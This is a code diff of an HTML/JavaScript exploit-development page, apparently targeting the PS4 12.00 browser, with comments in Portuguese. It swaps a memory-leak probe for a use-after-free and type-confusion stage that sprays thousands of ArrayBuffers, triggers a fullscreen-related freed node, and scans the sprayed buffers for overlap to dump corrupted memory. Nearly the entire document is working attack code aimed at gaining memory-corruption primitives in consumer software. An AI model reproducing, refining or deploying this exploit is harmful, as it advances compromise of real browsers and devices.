@@ -1,12 +1,13 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Memory Leak Stage</title>
+<title>PS4 12.00 - UAF Overlap Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Overread → Memory Leak</h2>
+<h2>UAF → Type Confusion → ArrayBuffer Overlap</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,7 +21,33 @@ function log(msg){
 }
 
 // ==========================
-// HEAP SETUP
+// 🌍 GLOBAL SPRAY (CRÍTICO)
+let ab_views = [];
+
+function setupABSpray(){
+    log("[*] Setup ArrayBuffer spray");
+
+    ab_views = [];
+
+    for (let i = 0; i < 12000; i++) {
+
+        let buf = new ArrayBuffer(0x40);
+        let view = new Uint32Array(buf);
+
+        view[0] = 0x41414141;
+        view[1] = 0x42424242;
+        view[2] = 0x43434343;
+
+        ab_views.push(view);
+    }
+
+    window.ab_views = ab_views;
+
+    log("[*] Spray pronto: " + ab_views.length);
+}
+
+// ==========================
+// HEAP SETUP (inalterado)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
@@ -32,7 +59,7 @@ function setupHeap(){
 }
 
 // ==========================
-// FULLSCREEN
+// FULLSCREEN (inalterado)
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
 
@@ -54,7 +81,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (MIXED SIZES)
+// 💣 RECLAIM (mantém padrão)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
 
@@ -70,14 +97,6 @@ function reclaim(size){
         let e=document.createElement("div");
         e.innerHTML="<h1>CONTROL_"+i+"</h1>";
         document.body.appendChild(e);
-    }
-
-    // 🔥 ArrayBuffer spray MIXED
-    let ab=[];
-    for(let i=0;i<4000;i++){
-        ab.push(new Uint8Array(new ArrayBuffer(0x20)));
-        ab.push(new Uint8Array(new ArrayBuffer(0x40)));
-        ab.push(new Uint8Array(new ArrayBuffer(0x80)));
     }
 }
 
@@ -100,80 +119,65 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OVERREAD + DUMP
-function leakProbe(fsTarget){
-    log("---- LEAK PROBE ----");
+// 🔬 OVERLAP PROBE
+function overlapProbe(fsTarget){
+    log("---- OVERLAP PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
 
+        if(!n){
+            log("[!] no node");
+            return;
+        }
+
         log("[CHECK] nodeType = " + n.nodeType);
 
-        if(n && n.nodeType === 3){
+        if(n.nodeType === 3){
 
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 write grande (expande buffer)
+            // 💣 WRITE PRIMITIVA
             try{
                 n.data = "A".repeat(0x200);
-                log("[PWN] expand write OK");
+                log("[PWN] write expand OK");
             }catch(e){
-                log("[UAF] expand write crash");
+                log("[UAF] write crash");
             }
 
-            // ==========================
-            // 🔥 substring overread
+            // 💣 SCAN ARRAYBUFFER
             try{
-                let big = n.substringData(0, 0x1000);
-                log("[LEAK+] substring len = " + big.length);
-                log("[LEAK+] preview = " + big.slice(0,50));
-            }catch(e){
-                log("[LEAK+] substring crash");
-            }
+                for(let i=0;i<ab_views.length;i++){
 
-            // ==========================
-            // 🔥 charCode dump
-            try{
-                let dump = [];
-                for(let i=0;i<128;i++){
-                    let c = n.data.charCodeAt(i);
-                    dump.push(c);
-                }
-                log("[LEAK] charCodes = " + dump.join(","));
+                    let v = ab_views[i];
 
-                // heurística
-                let suspicious = dump.some(v => v !== 65 && v !== 0);
-                if(suspicious){
-                    log("[!!!] POSSIVEL LEAK DE MEMORIA");
-                }
+                    if(
+                        v[0] !== 0x41414141 ||
+                        v[1] !== 0x42424242 ||
+                        v[2] !== 0x43434343
+                    ){
+                        log("[!!!] OVERLAP DETECTADO @ " + i);
+                        log("[!!!] values = " + v[0] + "," + v[1] + "," + v[2]);
 
-            }catch(e){
-                log("[LEAK] charCode crash");
-            }
+                        // 🔥 dump parcial
+                        let dump = [];
+                        for(let j=0;j<8;j++){
+                            dump.push(v[j]);
+                        }
 
-            // ==========================
-            // 🔥 leitura incremental (scan)
-            try{
-                let found = false;
-
-                for(let i=0;i<256;i++){
-                    let c = n.data.charCodeAt(i);
-
-                    if(c !== 65 && c !== 0){
-                        log("[SCAN] offset " + i + " = " + c);
-                        found = true;
-                        break;
+                        log("[DUMP] " + dump.join(","));
+                        return;
                     }
                 }
 
-                if(!found){
-                    log("[SCAN] nenhum byte estranho");
-                }
+                log("[SCAN] nenhum overlap detectado");
 
             }catch(e){
-                log("[SCAN] crash");
+                log("[UAF] scan crash");
             }
 
+        } else {
+            log("[INFO] nao virou TextNode");
         }
 
     }catch(e){
@@ -203,6 +207,7 @@ function trigger(fsTarget){
         setTimeout(()=>reclaim(s), i*50);
     });
 
+    // injeção crítica
     setTimeout(()=>{
         try{
             let child = fsTarget.firstChild;
@@ -210,17 +215,17 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
-    // 🔬 probes múltiplos
-    setTimeout(()=>leakProbe(fsTarget), 80);
-    setTimeout(()=>leakProbe(fsTarget), 160);
-    setTimeout(()=>leakProbe(fsTarget), 240);
+    // probes múltiplos
+    setTimeout(()=>overlapProbe(fsTarget), 80);
+    setTimeout(()=>overlapProbe(fsTarget), 160);
+    setTimeout(()=>overlapProbe(fsTarget), 240);
 
     // dump final
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // ⚠️ CRÍTICO
+    // ⚠️ NÃO ALTERAR
     setTimeout(()=>location.reload(), 500);
 }
 
@@ -228,6 +233,8 @@ function trigger(fsTarget){
 // MAIN
 function runTest(){
     log("[*] Iniciando teste");
+
+    setupABSpray(); // 🔥 CRÍTICO
 
     let heap=setupHeap();
     let fsTarget=setupFullscreen();
